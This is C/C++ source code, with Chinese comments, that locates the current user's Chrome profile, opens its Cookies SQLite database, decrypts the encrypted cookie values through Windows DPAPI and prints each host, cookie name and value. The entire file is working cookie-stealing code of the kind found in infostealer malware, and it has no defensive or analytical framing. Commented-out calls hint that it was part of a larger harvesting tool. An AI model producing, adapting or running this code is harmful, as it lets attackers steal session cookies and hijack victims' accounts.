#include <windows.h>
#define _CRT_SECURE_NO_WARNINGS 1

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <windows.h>
#include <userenv.h>
#include <shlobj.h>
#pragma comment(lib,"userenv.lib")

//#include "common.h"
#include "sqlite3.h"

#define SAFE_FREE(x)  { if(x) free(x); x = NULL; }


int DecryptPass(CHAR *cryptData, WCHAR *clearData, UINT clearSize)
{
	DATA_BLOB input;
	input.pbData = const_cast<BYTE*>(reinterpret_cast<const BYTE*>(cryptData));
	DATA_BLOB output;
	DWORD blen;

	for(blen=128; blen<=2048; blen+=16) {
		input.cbData = static_cast<DWORD>(blen);
		if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output))
			break;
	}
	if (blen>=2048)
		return 0;

	CHAR *decrypted = (CHAR *)malloc(clearSize);
	if (!decrypted) {
		LocalFree(output.pbData);
		return 0;
	}

	memset(decrypted, 0, clearSize);
	memcpy(decrypted, output.pbData, (clearSize < output.cbData) ? clearSize - 1 : output.cbData);

	_snwprintf_s(clearData, clearSize, _TRUNCATE, L"%S", decrypted);

	free(decrypted);
	LocalFree(output.pbData);

	return 1;
}

//获取Chrome浏览器的随机路径
WCHAR *GetCHProfilePath()
{
	WCHAR appPath[MAX_PATH];
	static WCHAR FullPath[MAX_PATH];

	memset(appPath, 0, sizeof(appPath));
	if (!SHGetSpecialFolderPathW(NULL, appPath, CSIDL_LOCAL_APPDATA, TRUE))
		return NULL;
	
	_snwprintf_s(FullPath, MAX_PATH, L"%s\\Google\\Chrome\\User Data\\Default", appPath);

	return FullPath;
}


int DirectoryExists(WCHAR *path)
{
	DWORD attr = GetFileAttributesW(path);

	if (!path)
		return 0;

	if( (attr < 0) || !(attr & FILE_ATTRIBUTE_DIRECTORY ) ) 
		return 0;

	return 1;
}


void NormalizeDomainA(char *domain)
{
	char *src, *dst;
	if (!domain)
		return;
	src = dst = domain;
	for(; *src=='.'; src++);
	for (;;) {
		if (*src == '/' || *src==NULL)
			break;
		*dst = *src;
		dst++;
		src++;
	}
	*dst = NULL;
}

//sqlite数据库解析 回调函数
int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azColName)
{
	char *host = NULL;
	char *name = NULL;
	char *value = NULL;

	WCHAR enc_value[2048];
	char enc_value_a[2048];

	ZeroMemory(enc_value, sizeof(enc_value));
	ZeroMemory(enc_value_a, sizeof(enc_value_a));

	for(int i=0; i<argc; i++){
		if(!host && !_stricmp(azColName[i], "host_key"))
			host = _strdup(argv[i]);
		if(!name && !_stricmp(azColName[i], "name"))
			name = _strdup(argv[i]);
		if(!value && !_stricmp(azColName[i], "value"))
			value = _strdup(argv[i]);
		if(!_stricmp(azColName[i], "encrypted_value") && argv[i] && argv[i][0]) {
			DecryptPass(argv[i], enc_value, 2048);
			_snprintf_s(enc_value_a, sizeof(enc_value_a), _TRUNCATE, "%S", enc_value);		
		}
	}	
	 //字符串分割
	NormalizeDomainA(host);

	//对感兴趣的cookie过滤
	if (host && name && value) {
		if (value[0]==NULL && enc_value_a[0]!=NULL) //cookie有加密的情况
			//AddCookieA(host, name, enc_value_a);
			printf("host=%s,\tname=%s,\tenc_value_a=%s\n",host,name,enc_value_a);
		else	//cookie没有加密的情况
			printf("host=%s,\tname=%s,\tvalue=%s\n",host,name,value);
			//AddCookieA(host, name, value);
	}

	SAFE_FREE(host);
	SAFE_FREE(name);
	SAFE_FREE(value);

	return 0;
}

char *GetDosAsciiName(WCHAR *orig_path)
{
	char *dest_a_path;
	WCHAR dest_w_path[_MAX_PATH + 2];
	DWORD mblen;

	memset(dest_w_path, 0, sizeof(dest_w_path));
	if (!GetShortPathNameW(orig_path, dest_w_path, (sizeof(dest_w_path) / sizeof (WCHAR))-1))
		return NULL;

	if ( (mblen = WideCharToMultiByte(CP_ACP, 0, dest_w_path, -1, NULL, 0, NULL, NULL)) == 0 )
		return NULL;

	if ( !(dest_a_path = (char *)malloc(mblen)) )
		return NULL;

	if ( WideCharToMultiByte(CP_ACP, 0, dest_w_path, -1, (LPSTR)dest_a_path, mblen, NULL, NULL) == 0 ) {
		free(dest_a_path);
		return NULL;
	}

	return dest_a_path;
}

int static DumpSqliteCookies(WCHAR *profilePath, WCHAR *signonFile)
{
	sqlite3 *db;
	char *ascii_path;
	CHAR sqlPath[MAX_PATH];
	int rc;

	//转换编码
	if (!(ascii_path = GetDosAsciiName(profilePath)))
		return 0;

	sprintf_s(sqlPath, MAX_PATH, "%s\\%S", ascii_path, signonFile);

	SAFE_FREE(ascii_path);
	//打开Chrome浏览器cookie存放数据库
	rc = sqlite3_open(sqlPath, &db);
	if (rc) 
		return 0;

	//执行查询语句
	sqlite3_exec(db, "SELECT * FROM cookies;", parse_sqlite_cookies, NULL, NULL);

	//关闭数据库
	sqlite3_close(db);

	return 1;
}

int DumpCHCookies(void)
{
	WCHAR *ProfilePath = NULL; 	//Profile path

	ProfilePath = GetCHProfilePath();

	printf("%S\n",ProfilePath);

	if (ProfilePath == NULL || !DirectoryExists(ProfilePath)) 
		return 0;

	DumpSqliteCookies(ProfilePath, L"Cookies"); 

	return 0;
}

int main() 
{
	DumpCHCookies();
	system("pause");
	return 0;
}